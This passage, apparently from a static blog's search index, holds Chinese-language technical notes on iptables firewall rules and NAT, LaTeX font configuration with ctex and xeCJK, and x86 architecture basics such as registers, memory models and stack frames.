Header\uff08IP\u5c42\u8fdb\u884c\u4e86\u5206\u7247\uff09\u3002nat table is only traversed by the first packet in a connection</li> <li>mangle\uff1a\u7528\u4e8e\u4fee\u6539packet\u7684header\u4fe1\u606f\uff0c\u5982TTL, TOS\u3002\u6216\u8005\u5728\u5185\u6838\u7a7a\u95f4\u7ed9packet\u6253\u4e0a\u6807\u8bb0(MARK)\uff0c\u5176\u4ed6\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7\u8be5mark\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\u3002</li> </ul> <p>TTL\u7684\u5947\u5999\u4f5c\u7528\uff0cISP\u5355\u8fde\u63a5\u591a\u8ba1\u7b97\u673a\u68c0\u6d4b\uff1aThe TTL target is used to change the TTL (Time To Live) field of the packet. We could tell packets to only have a specific TTL and so on. One good reason for this could be that we don't want to give ourself away to nosy Internet Service Providers. Some Internet Service Providers do not like users running multiple computers on one single connection, and there are some Internet Service Providers known to look for a single host generating different TTL values, and take this as one of many signs of multiple computers connected to a single connection.</p> <ul> <li>security\uff1ais used for Mandatory Access Control networking rules (e.g. SELinux -- see this article for more details)</li> </ul> <p>\u901a\u5e38\u53ea\u9700\u8981\u4f7f\u7528filter\u548cnat\u8868\uff0cmangle\u8868\u7528\u4e8e\u66f4\u590d\u6742\u7684\u64cd\u4f5c\u3002</p>","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#iptables\u547d\u4ee4","title":"iptables\u547d\u4ee4","text":"<ul> <li>\u683c\u5f0f   <pre><code>iptables [-t table] command [chain] [match] [target/jump]\n</code></pre></li> <li>\u4e0d\u6307\u5b9a-t\u65f6\uff0c\u9ed8\u8ba4\u6307\u5b9afilter\u8868</li> </ul>","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u547d\u4ee4\u9009\u9879","title":"\u547d\u4ee4\u9009\u9879","text":"<p>\u67e5\u770b\u3001\u6dfb\u52a0\u3001\u5220\u9664\u6307\u5b9atable\u6307\u5b9achain\u4e2d\u7684\u89c4\u5219(rule) - -L chain: \u5217\u51fa\u6307\u5b9a\u94fe\u4e2d\u6240\u6709\u7684\u89c4\u5219\u8fdb\u884c\u67e5\u770b - -A chain rule-specification: \u5728\u6307\u5b9a\u94fe chain \u7684\u672b\u5c3e\u63d2\u5165\u6307\u5b9a\u7684\u89c4\u5219\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u6761\u89c4\u5219\u4f1a\u88ab\u653e\u5230\u6700\u540e\uff0c\u6700\u540e\u624d\u4f1a\u88ab\u6267\u884c\u3002\u89c4\u5219\u662f\u7531\u540e\u9762\u7684\u5339\u914d\u6765\u6307\u5b9a\u3002 - -I chain [rulenum] rule-specification: \u5728\u94fe chain \u4e2d\u7684\u6307\u5b9a\u4f4d\u7f6e\u63d2\u5165\u4e00\u6761\u6216\u591a\u6761\u89c4\u5219\u3002\u5982\u679c\u6307\u5b9a\u7684\u89c4\u5219\u53f7\u662f1\uff0c\u5219\u5728\u94fe\u7684\u5934\u90e8\u63d2\u5165\u3002\u8fd9\u4e5f\u662f\u9ed8\u8ba4\u7684\u60c5\u51b5\u3002 - -D chain rulenum: \u5728\u6307\u5b9a\u7684\u94fe chain \u4e2d\u5220\u9664\u4e00\u4e2a\u6216\u591a\u4e2a\u6307\u5b9a\u89c4\u5219\u3002 - -R rulenum\uff1a\u66ff\u6362/\u4fee\u6539\u7b2c\u51e0\u6761\u89c4\u5219</p> <p>\u521b\u5efa\u3001\u5220\u9664\u65b0\u94fe - -N, --new-chain chain \u7528\u6307\u5b9a\u7684\u540d\u5b57\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u94fe\u3002 - -X, --delete-chain [chain] \uff1a\u5220\u9664\u6307\u5b9a\u7684\u94fe\uff0c\u8fd9\u4e2a\u94fe\u5fc5\u987b\u6ca1\u6709\u88ab\u5176\u5b83\u4efb\u4f55\u89c4\u5219\u5f15\u7528\uff0c\u800c\u4e14\u8fd9\u6761\u4e0a\u5fc5\u987b\u6ca1\u6709\u4efb\u4f55\u89c4\u5219\u3002\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u94fe\u540d\uff0c\u5219\u4f1a\u5220\u9664\u8be5\u8868\u4e2d\u6240\u6709\u975e\u5185\u7f6e\u7684\u94fe\u3002 - -F, --flush [chain] \u6e05\u7a7a\u6307\u5b9a\u94fe chain \u4e0a\u9762\u7684\u6240\u6709\u89c4\u5219\u3002\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u94fe\uff0c\u6e05\u7a7a\u8be5\u8868\u4e0a\u6240\u6709\u94fe\u7684\u6240\u6709\u89c4\u5219\u3002 - -E, --rename-chain old-chain new-chain \uff1a\u7528\u6307\u5b9a\u7684\u65b0\u540d\u5b57\u53bb\u91cd\u547d\u540d\u6307\u5b9a\u7684\u94fe\u3002\u8fd9\u5e76\u4e0d\u4f1a\u5bf9\u94fe\u5185\u90e8\u9020\u6210\u4efb\u4f55\u5f71\u54cd\u3002 - -Z, --zero [chain] \uff1a\u628a\u6307\u5b9a\u94fe\uff0c\u6216\u8005\u8868\u4e2d\u7684\u6240\u6709\u94fe\u4e0a\u7684\u6570\u636e\u5305\u8ba1\u6570\u5668\u548c\u6d41\u91cf\u8ba1\u6570\u5668\u5f52\u96f6\u3002 - -P, --policy chain target \uff1a\u4e3a\u6307\u5b9a\u7684\u94fe chain \u8bbe\u7f6e\u7b56\u7565 target\u3002\u6ce8\u610f\uff0c\u53ea\u6709\u5185\u7f6e\u7684\u94fe\u624d\u5141\u8bb8\u6709\u7b56\u7565\uff0c\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u662f\u4e0d\u5141\u8bb8\u7684\u3002</p>","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u5339\u914d\u9009\u9879","title":"\u5339\u914d\u9009\u9879","text":"<ul> <li>-i\uff1a\u6307\u5b9a\u6570\u636e\u5305\u4ece\u54ea\u4e2a\u63a5\u53e3\u8fdb\u5165</li> <li>-o\uff1a\u6307\u5b9a\u6570\u636e\u5305\u4ece\u54ea\u4e2a\u7f51\u7edc\u63a5\u53e3\u8f93\u51fa</li> <li>-p\uff1a\u6307\u5b9a\u6570\u636e\u5305\u5339\u914d\u7684\u534f\u8bae</li> <li>-s\uff1a\u6307\u5b9a\u6570\u636e\u5305\u5339\u914d\u7684\u6e90\u5730\u5740</li> <li>-sport &lt;\u6e90\u7aef\u53e3\u53f7&gt;\uff1a\u6307\u5b9a\u6570\u636e\u5305\u5339\u914d\u7684\u6e90\u7aef\u53e3\u53f7\uff0c\u53ef\u4ee5\u4f7f\u7528[\u8d77\u59cb\u7aef\u53e3\u53f7\uff1a\u7ed3\u675f\u7aef\u53e3\u53f7]\u7684\u683c\u5f0f\u6307\u5b9a\u4e00\u4e2a\u8303\u56f4\u7684\u7aef\u53e3</li> <li>-d\uff1a\u6307\u5b9a\u6570\u636e\u5305\u5339\u914d\u7684\u76ee\u6807\u5730\u5740</li> <li>-dport &lt;\u76ee\u6807\u7aef\u53e3\u53f7&gt;\uff1a\u6307\u5b9a\u6570\u636e\u5305\u5339\u914d\u7684\u76ee\u6807\u7aef\u53e3\u53f7\uff0c\u53ef\u4ee5\u4f7f\u7528[\u8d77\u59cb\u7aef\u53e3\u53f7\uff1a\u7ed3\u675f\u7aef\u53e3\u53f7]\u7684\u683c\u5f0f\u6307\u5b9a\u4e00\u4e2a\u8303\u56f4\u7684\u7aef\u53e3</li> <li>!: \u5426\u5b9a\u4fee\u9970</li> </ul> <p>p.s. \u8fd8\u6709\u66f4\u9ad8\u7ea7\u7684\u5339\u914d\u9009\u9879\uff0c\u5982Conntrack\u5339\u914d <pre><code>iptables -A INPUT -p tcp -m conntrack --ctstate RELATED\n</code></pre></p>","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u52a8\u4f5c\u9009\u9879","title":"\u52a8\u4f5c\u9009\u9879","text":"<p>iptables(8) - Linux man page (die.net)</p> <p>p.s \u8bb8\u591a\u52a8\u4f5c(target)\u53ea\u9002\u7528\u4e8e\u7279\u5b9a\u7684table\u548cchain\u4e2d\uff0c\u9700\u8981\u6ce8\u610f</p> <ul> <li>ACCEPT\uff1a\u63a5\u6536\u6570\u636e\u5305</li> <li>DROP\uff1a\u4e22\u5f03\u6570\u636e\u5305</li> <li>REJECT\uff1a\u4e22\u5f03\u6570\u636e\u5305\uff0c\u5e76\u54cd\u5e94ICMP\u9519\u8bef\u4fe1\u606f</li> <li>RETURN\uff1a\u8ba9\u89c4\u5219\u904d\u5386\u505c\u6b62\uff0c\u6216\u5219\u8fd4\u56de\u4e0a\u4e00\u6761\u94fe</li> <li>LOG\uff1a\u65e5\u5fd7\u529f\u80fd\uff0c\u5c06\u7b26\u5408\u89c4\u5219\u7684\u6570\u636e\u5305\u7684\u76f8\u5173\u4fe1\u606f\u8bb0\u5f55\u5728\u65e5\u5fd7\u4e2d\uff0c\u4ee5\u4fbf\u7ba1\u7406\u5458\u7684\u5206\u6790\u548c\u6392\u9519</li> </ul>","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#nat\u76f8\u5173","title":"NAT\u76f8\u5173","text":"<ul> <li>SNAT\uff1a\u4fee\u6539packet\u7684\u6e90\u5730\u5740\uff0c\u5373\u6211\u4eec\u5e38\u7528\u7684NAT\u529f\u80fd</li> <li>\u9002\u7528\u8303\u56f4\uff1anat\u8868, postrouting\u94fe   <pre><code>iptables -t nat -A POSTROUTING -s 192.168.188.0/24 -j SNAT --to-source 210.14.67.127\n</code></pre></li> <li>MASQUERADE</li> <li>\u9002\u7528\u8303\u56f4\uff1anat\u8868, postrouting\u94fe   \u4e0d\u7528\u6307\u5b9a--to-source\uff0c\u7528\u4e8e\u52a8\u6001\u83b7\u5f97\u5730\u5740\uff08\u5982dhcp\u3001pppoe\uff09\u7684\u60c5\u51b5\uff0c\u9759\u6001\u5730\u5740\u5e94\u8be5\u4f7f\u7528SNAT\u3002   <pre><code># iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o ppp0 -j MASQUERADE\n</code></pre></li> <li>DNAT\uff1a\u7528\u4e8e\u6539\u53d8\u76ee\u7684\u5730\u5740\uff08\u548c\u7aef\u53e3\uff09</li> <li>\u9002\u7528\u8303\u56f4\uff1anat\u8868, prerouting, output\u94fe   <pre><code>iptables -t nat -A PREROUTING -i ppp0 -p tcp --dport 8000 -j DNAT --to 192.168.0.6:80\niptables -A fw-open -d 192.168.0.6 -p tcp --dport 80 -j ACCEPT\n</code></pre></li> <li>REDIRECT\uff1a\u5c06\u76ee\u7684\u5730\u5740\u6539\u7f16\u4e3a\u672c\u673a\uff08\u8f93\u5165\u63a5\u53e3\u7684\u4e3b\u5730\u5740\uff0c\u5982\u679c\u4e3a\u672c\u673a\u4ea7\u751f\u7684\u5305\u5219\u4e3a127.0.0.1\uff09</li> <li>\u9002\u7528\u8303\u56f4\uff1anat\u8868, prerouting, output\u94fe</li> </ul>","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#mark","title":"MARK","text":"<ul> <li> <p>MARK: The MARK target is used to set Netfilter mark values that are associated with specific packets. This target is only valid in the mangle table, and will not work outside there.   <pre><code>iptables -t mangle -A PREROUTING -p tcp --dport 22 -j MARK --set-mark 2\n</code></pre>   For example, we may set mark 2 on a specific stream of packets, or on all packets from a specific host and then do advanced routing on that host, to decrease or increase the network bandwidth, etc.</p> </li> <li> <p>CONNMARK: The CONNMARK target is used to set a mark on a whole connection, much the same way as the MARK target does.</p> </li> </ul> <pre><code>iptables -t nat -A PREROUTING -p tcp --dport 80 -j CONNMARK --set-mark 4\n</code></pre>","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#list-table","title":"list table","text":"<pre><code>iptables -nvL -t &lt;table&gt;    #\u9ed8\u8ba4filter\u8868\n#or\niptables-save\n</code></pre>","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u4fdd\u5b58\u548c\u6062\u590d","title":"\u4fdd\u5b58\u548c\u6062\u590d","text":"<pre><code>iptables-save &gt; file\niptables-restore &lt;file\n</code></pre>","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u6301\u4e45\u5316","title":"\u6301\u4e45\u5316","text":"<p>iptables\u914d\u7f6e\u6301\u4e45\u5316 \u2014 Cloud Atlas 0.1 \u6587\u6863 (cloud-atlas.readthedocs.io)</p>","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u91cd\u7f6erule","title":"\u91cd\u7f6erule","text":"<pre><code>iptables -F\niptables -X\n</code></pre>","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>iptables - ArchWiki (archlinux.org)</li> <li>\u6700\u5168\u8d44\u6599\uff1ahttps://www.frozentux.net/iptables-tutorial/iptables-tutorial.html</li> <li>\u5176\u4e2d\u4ecb\u7ecd\u5404\u4e2atable\u548cchain\u662f\u5982\u4f55\u904d\u5386\u7684\uff1aIptables Tutorial 1.2.2 (frozentux.net)</li> <li> <p>Iptables REDIRECT vs. DNAT vs. TPROXY \u2013 What I've learned during GSoC \u2013 Here I describe what I've learned during contributing to the netfilter project during my GSoC participation in 2018 hoping that it will help others looking for hard-to find information. (ecklm.com)</p> </li> <li> <p>\u672c\u5730\u8fdb\u7a0b\u4ea7\u751f\u7684\u5305\u5728output chain\u4e4b\u524d\u8fdb\u884c\u4e00\u6b21\u8def\u7531\uff0c\u5f97\u5230src ip\u3002\u4e4b\u540e\u5982\u679c\u8fdb\u884c\u4e86dnat\uff0c\u5219\u4f1a\u91cd\u65b0\u8fdb\u884c\u8def\u7531\u3002Linux netfilter Hacking HOWTO: Netfilter Architecture</p> </li> <li>\u5199\u5f97\u5f88\u597d\uff1anetfilter\u6570\u636e\u6d41\u56fe | C0reFast\u8bb0\u4e8b\u672c (ichenfu.com)</li> </ul>","tags":["iptables"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/04/21/2022-04-21-latex%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/","title":"latex\u5b57\u4f53\u5206\u7c7b","text":"<p>latex\u4e2d\u8bbe\u8ba1\u5230\u7684\u5b57\u4f53\u5982\u4f55\u8fdb\u884c\u7cfb\u7edf\u5206\u7c7b</p>","tags":["latex"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/04/21/2022-04-21-latex%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#\u82f1\u6587","title":"\u82f1\u6587","text":"","tags":["latex"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/04/21/2022-04-21-latex%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#\u5b57\u4f53\u65cf","title":"\u5b57\u4f53\u65cf","text":"","tags":["latex"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/04/21/2022-04-21-latex%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#\u5b57\u4f53\u5f62\u72b6","title":"\u5b57\u4f53\u5f62\u72b6","text":"","tags":["latex"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/04/21/2022-04-21-latex%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#\u5b57\u4f53\u7cfb\u5217","title":"\u5b57\u4f53\u7cfb\u5217","text":"","tags":["latex"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/04/21/2022-04-21-latex%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#\u7ec4\u5408","title":"\u7ec4\u5408","text":"","tags":["latex"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/04/21/2022-04-21-latex%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#\u4e2d\u6587","title":"\u4e2d\u6587","text":"<pre><code>\\textrm{}   \\rmfamily\n\\textsf{}   \\sffamily\n\\texttt{}   \\ttfamily\n\n\u76f4\u7acb    \\textup{}   \\upshape\n\u610f\u5927\u5229  \\textit{}   \\itshape\n\u503e\u659c    \\textsl{}   \\slshape\n\u5c0f\u578b\u5927\u5199\\textsc{}   \\scshape\n</code></pre> <ul> <li> <p>\u82f1\u6587\u5b57\u4f53\uff0c\u540c\u4e00\u4e2a\u5b57\u4f53\u65cf\uff0c\u6709\u4e0d\u540c\u5f62\u72b6\u3001\u7cfb\u5217\u7684\u53d8\u4f53\u3002\u800c\u4e2d\u6587\u5b57\u4f53\u4e00\u822c\u4e00\u4e2a\u5b57\u4f53\u65cf\u5c31\u662f\u4e00\u79cd\u5b57\u4f53\u3002</p> </li> <li> <p>ctex\u5b8f\u5305\u9488\u5bf9windows\u5e38\u7528\u5b57\u4f53\u914d\u7f6e\u4e864\u79cd\u5b57\u4f53\u65cf\uff1a</p> </li> </ul> <pre><code>{\\songti \u5b8b\u4f53} \\quad {\\heiti \u9ed1\u4f53} \\quad {\\fangsong \u4eff\u5b8b} \\quad {\\kaishu \u6977\u4e66}\n</code></pre> <ul> <li> <p>ctex\u9ed8\u8ba4\u7684\u4e2d\u6587\u5b57\u4f53\u65cf\u662frm\uff0c\u6b63\u5e38\u5b57\u4f53\u662f\u5b8b\u4f53\uff0c\u7c97\u4f53\u662f\u9ed1\u4f53\uff0c\u610f\u5927\u5229\u4f53\u662f\u6977\u4f53\u3002sc\u9ed8\u8ba4\u662f\u5e7c\u5706\uff0ctt\u662f\u4eff\u5b8b\u3002</p> </li> <li> <p>\u9ed8\u8ba4\u60c5\u51b5\u667a\u80fd\u4f7f\u75283\u79cd\u5b57\u4f53\uff0c\u5373rm, sc, tt\u5b57\u4f53\u65cf\u9ed8\u8ba4\u7684\u5b57\u4f53</p> </li> </ul> <pre><code>\\usepackage{fontspec}\n\\setmainfont{Times New Roman}\n\\setsansfont{Arial}\n\\setmonofont{Cascadia Mono}\n</code></pre> <p>\u53ef\u4ee5\u901a\u8fc7\\newfontfamily\u8bbe\u7f6e\u65b0\u7684\u5b57\u4f53\u65cf</p> <pre><code>\\newfontfamily\\lucidasans{Lucida Sans}\n{\\lucidasans This is Lucida Sans}\n</code></pre> <ul> <li>\u4e2d\u6587\u901a\u8fc7xeCJK\u5b8f\u5305\u8bbe\u7f6e</li> </ul> <pre><code>\\setCJKmainfont{SimSun}\n\\setCJKsansfont{YouYuan}\n\\setCJKmonofont{KaiTi}\n\\setCJKfamilyfont{kai}{KaiTi}\n</code></pre> <pre><code>\\setCJKmainfont[BoldFont=SimHei,ItalicFont=KaiTi,BoldItalicFont=LiSu]{SimSum}\n</code></pre> <ul> <li>\u5217\u51fa\u6240\u6709\u4e2d\u6587\u5b57\u4f53</li> </ul> <pre><code>fc-list :lang=zh\n</code></pre>","tags":["latex"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/","title":"\u8bfbx86\u624b\u518c\u8bb0\u5f55","text":"<ul> <li>\u5e38\u89c1\u770b\u540d\u5b57\u731c\u6d4b\u4e0d\u4e86\u529f\u80fd\u7684\u6307\u4ee4</li> <li>\u64cd\u4f5c\u6a21\u5f0f</li> <li>\u5185\u5b58\u7ba1\u7406</li> <li>\u51fd\u6570\u8c03\u7528</li> <li>\u5f02\u5e38</li> <li>ucore<ul> <li>\u6bb5</li> <li>- \u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668\ufa38\u4e2d\u7684CPL\u5b57\u6bb5\uff082\u4f4d\uff09\u7684\u503c\u603b\u662f\u7b49\u4e8eCPU\u7684\u5f53\u524d\u7279\u6743\u7ea7\uff0c\u6240\u4ee5\u53ea\u8981\u770b\u2f00\u4e00\u773cCS\u4e2d\u7684CPL\uff0c\u4f60\u5c31\u53ef\u4ee5\u77e5\u9053 \u6b64\u523b\u7684\u7279\u6743\u7ea7\u4e86\uf9ba\u3002</li> </ul> </li> </ul>","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#\u5e38\u89c1\u770b\u540d\u5b57\u731c\u6d4b\u4e0d\u4e86\u529f\u80fd\u7684\u6307\u4ee4","title":"\u5e38\u89c1\u770b\u540d\u5b57\u731c\u6d4b\u4e0d\u4e86\u529f\u80fd\u7684\u6307\u4ee4","text":"<pre><code>lea //Load Effective Address\n\ntest //Logical Compare, Computes the bit-wise logical AND of first operand \n    //(source 1 operand) and the second operand (source 2 operand) and \n    //sets the SF, ZF, and PF status flags according to the result. The result is then discarded.\n\nincl    //Adds 1 to the destination operand, while preserving the state of the CF flag. \n        //The destination operand can be a register or a memory location. This instruction \n        //allows a loop counter to be updated without disturbing the CF flag. (Use a ADD \n        //instruction with an immediate operand of 1 to perform an increment operation that does updates the CF flag.)\n</code></pre>","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#\u64cd\u4f5c\u6a21\u5f0f","title":"\u64cd\u4f5c\u6a21\u5f0f","text":"<p>IA32</p> <ul> <li>real address mode\uff1a\u7528\u4e8e\u517c\u5bb98086\uff0c\u53ea\u80fd\u8bbf\u95ee1MB\u7a7a\u95f4</li> <li>protected mode\uff1a32\u4f4d\u4e00\u822c\u60c5\u51b5</li> <li>system management mod</li> </ul> <p>IA64\u65b0\u589e</p> <ul> <li>Compatiblity mode</li> <li> <p>64-bit mode</p> </li> <li> <p>\u8d44\u6e90</p> <ul> <li>\u57fa\u672c\u8d44\u6e90\uff1a\u7528\u4e8e\u6267\u884c\u7528\u6237\u7a0b\u5e8f\u548c\u64cd\u4f5c\u7cfb\u7edf</li> </ul> <p>IA32\u6574\u6570\u90e8\u5206\u5bc4\u5b58\u5668\uff1a</p> <ul> <li> <p>8\u4e2a\u901a\u7528\u5bc4\u5b58\u5668(32bits)\uff1aEAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP</p> </li> <li> <p>6\u4e2a\u6bb5\u5bc4\u5b58\u5668(16bits)\uff1aCS, DS, SS, ES, FS, GS</p> </li> <li> <p>EFLGAS(32bits)</p> <p></p> </li> <li> <p>EIP(32bits)</p> </li> </ul> <p></p> <ul> <li> <p>\u7279\u6743\u8d44\u6e90\uff1a\u4f5c\u4e3a\u7cfb\u7edf\u7ea7\u67b6\u6784\u7684\u4e00\u90e8\u5206\uff0c\u7528\u4e8e\u652f\u6301\u64cd\u4f5c\u7cfb\u7edf\u548c\u7cfb\u7edf\u7ea7\u8f6f\u4ef6</p> </li> <li> <p>I/O ports</p> </li> <li>\u63a7\u5236\u5bc4\u5b58\u5668\uff1aCR0-CR4\uff0c\u7528\u4e8e\u63a7\u5236\u5904\u7406\u5668\u7684\u64cd\u4f5c\u6a21\u5f0f</li> <li>\u5185\u5b58\u7ba1\u7406\u5bc4\u5b58\u5668\uff1aGDTR, IDTR, LDTR, ...</li> <li>Performance monitoring counters\uff1a\u7528\u4e8e\u76d1\u63a7\u6027\u80fd\u4e8b\u4ef6</li> </ul> </li> </ul>","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#\u5185\u5b58\u7ba1\u7406","title":"\u5185\u5b58\u7ba1\u7406","text":"<ol> <li> <p>\u5185\u5b58\u6a21\u578b</p> </li> <li> <p>Flat memory model: \u7ebf\u6027\u5730\u5740\uff0c0-2^32-1</p> </li> <li>Segmented memory model\uff1a\u5c06\u5185\u5b58\u5206\u4e3a\u4e00\u4e2a\u72ec\u7acb\u7684\u5730\u5740\u7a7a\u95f4\u79f0\u4e3a\u6bb5\u3002\u5982\u4ee3\u7801\u3001\u6570\u636e\u3001\u6808\u7b49\u90fd\u53ef\u4ee5\u5b58\u653e\u5728\u4e0d\u540c\u7684\u6bb5\u91cc\u3002\u903b\u8f91\u5730\u5740=(segment selector, offset)\u3002\u4e00\u5171\u53ef\u4ee5\u67092\\^14-1\u4e2a\u6bb5\uff0c\u6bcf\u4e2a\u6bb5\u6700\u5927\u4e3a2\\^32B\u3002</li> <li> <p>real-address mode memory model: The real-address mode uses a specific implementation of segmented memory in which the linear address space for the program and the operating system/executive consists of an array of segments of up to 64 KBytes in size each. The maximum size of the linear address space in real-address mode is 2 20  bytes.</p> </li> <li> <p>\u5206\u9875\u548c\u865a\u62df\u5185\u5b58\uff1a\u65e0\u8bba\u662fflat\u6a21\u5f0f\u8fd8\u662fsegemented\u6a21\u5f0f\uff0c\u7ebf\u6027\u5730\u5740\u5747\u901a\u8fc7\u5206\u9875\u6620\u5c04\u5230\u7269\u7406\u5730\u5740\u3002(\u9700\u8981\u5f00\u542f\u5206\u9875)</p> </li> <li> <p>Extended Physical Addressing in Protected Mode Beginning with P6 family processors, the IA-32 architecture supports addressing of up to 64 GBytes (2 36  bytes) of physical memory. A program or task could not address locations in this address space directly. Instead, it addresses individual linear address spaces of up to 4 GBytes that mapped to 64-GByte physical address space through a virtual memory management mechanism. Using this mechanism, an operating system can enable a program to switch 4-GByte linear address spaces within 64-GByte physical address space.</p> </li> </ol> <p>The use of extended physical addressing requires the processor to operate in protected mode and the operating system to provide a virtual memory management system. See \u201c36-Bit Physical Addressing Using the PAE Paging Mechanism\u201d in Chapter 3, \u201cProtected-Mode Memory Management,\u201d of the Intel\u00ae 64 and IA-32 Architectures Soft-ware Developer\u2019s Manual, Volume 3A.</p>","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#\u51fd\u6570\u8c03\u7528","title":"\u51fd\u6570\u8c03\u7528","text":"<ol> <li> <p>stack\uff1a\u4e00\u4e2a\u6808\u5e27\uff0c\u4e3b\u8981\u5305\u542b\u8c03\u7528\u53c2\u6570\u3001\u8fd4\u56de\u5730\u5740\u3001\u5c40\u90e8\u53d8\u91cf\u3002\u901a\u5e38\u6808\u5e95\u4e3a\u9ad8\u5730\u5740\u4f4d</p> </li> <li> <p>aa</p> </li> </ol> <p></p> <ol> <li>EBP\uff08Stack Base Pointer\uff09\uff1aRET\u4ece\u5f53\u524d\u6808\u9876(ESP)\u5f39\u6808\uff0c\u5e76\u5f39\u6808\u503c\u5199\u5165EIP\u4e2d\u3002\u5904\u7406\u5668\u4e0d\u4f1a\u4fdd\u8bc1RET\u5f39\u6808\u503c\u5c31\u662f\u8fd4\u56de\u5730\u5740\uff0c\u56e0\u6b64\u9700\u8981\u7a0b\u5e8f\u5458\u4fdd\u8bc1\u3002</li> </ol> <p>\u5e38\u89c1\u505a\u6cd5\u662f\u5728\u88ab\u8c03\u7528\u51fd\u6570\u7b2c\u4e00\u53e5\uff0c\u5c06EBP\u8bbe\u7f6e\u4e3aESP\uff08\u6267\u884cCALL\u540e\uff0c\u5904\u7406\u5668\u5c06EIP\u538b\u5165\u6808\uff0c\u56e0\u6b64\u6808\u9876\u5373\u5bf9\u5e94\u8fd4\u56de\u5730\u5740\uff09\uff0c\u5728\u8c03\u7528RET\u8fd4\u56de\u524d\uff0c\u5c06ESP\u91cd\u8bbe\u4e3aEBP\u3002</p> <p>\u4e0d\u8fc7\u76ee\u524d\u7684\u505a\u6cd5\u4f1a\u5728\u88ab\u8c03\u7528\u51fd\u6570\u7684\u7b2c\u4e00\u53e5\u5148\u5c06EBP\u538b\u5165\u6808\u4e2d\uff08\u5bf9\u5e94\u4e0a\u4e00\u5c42\u7684EBP\uff09\uff0c\u518d\u5c06EBP\u8bbe\u7f6e\u4e3aESP\u3002</p> <p>\u4e8e\u662f\u6211\u4eec\u4fbf\u6709\u5173\u7cfb\uff1aEBP+4\u5bf9\u5e94\u5f53\u524d\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u3002\u8fd9\u6837\u4fbf\u53ef\u4ee5\u901a\u8fc7EBP\u904d\u5386\u6574\u4e2a\u8c03\u7528\u6808</p> <p></p> <pre><code>func:\n    804913b: 55                      push   %ebp\n    804913c: 89 e5                   mov    %esp,%ebp\n    ...\n\n    80491ac: 5d                      pop    %ebp\n    80491ad: c3                      ret    \n</code></pre> <ol> <li> <p>\u4f20\u53c2</p> </li> <li> <p>\u901a\u7528\u5bc4\u5b58\u5668\uff088-2=6\uff09</p> </li> <li>Stack</li> <li>arguement list\uff1a\u4f20\u4e00\u4e2apointer\u6307\u5411arguement list\u3002\u4f20\u5927\u91cf\u6570\u636e\u7684\u65b9\u5f0f</li> </ol> <p>\u4fdd\u5b58\u53d8\u91cf\uff1aPUSHA pushes the values in all the general-purpose registers on the stack in the following order: EAX, ECX, EDX, EBX, ESP  (the value prior to executing the PUSHA instruction), EBP, ESI, and EDI.  POPA does the inverse</p> <ol> <li> 